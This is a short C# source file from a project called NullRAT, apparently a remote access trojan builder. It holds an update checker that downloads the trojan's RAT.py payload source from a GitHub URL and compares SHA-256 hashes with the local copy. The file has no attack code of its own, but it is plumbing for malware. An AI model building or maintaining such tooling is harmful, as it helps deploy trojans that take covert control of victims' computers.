namespace NullRAT.Compiler.Updater
{
    internal class CheckRATUpdate
    {
        public static RequestResponse CheckUpdate()
        {
            RequestResponse resp = GetLatestRAT.GetRAT("https://raw.githubusercontent.com/NullCode1337/NullRAT/source/src/RAT.py", WebData.HttpClient);

            if (!GetLatestRAT.CalculateSHA256(resp.DataAsStream, Environment.CurrentDirectory + @"\src\RAT.py"))
            {
                InstanceData.UpdateAvailable = true;
            }            
            return resp;
        }
    }
}
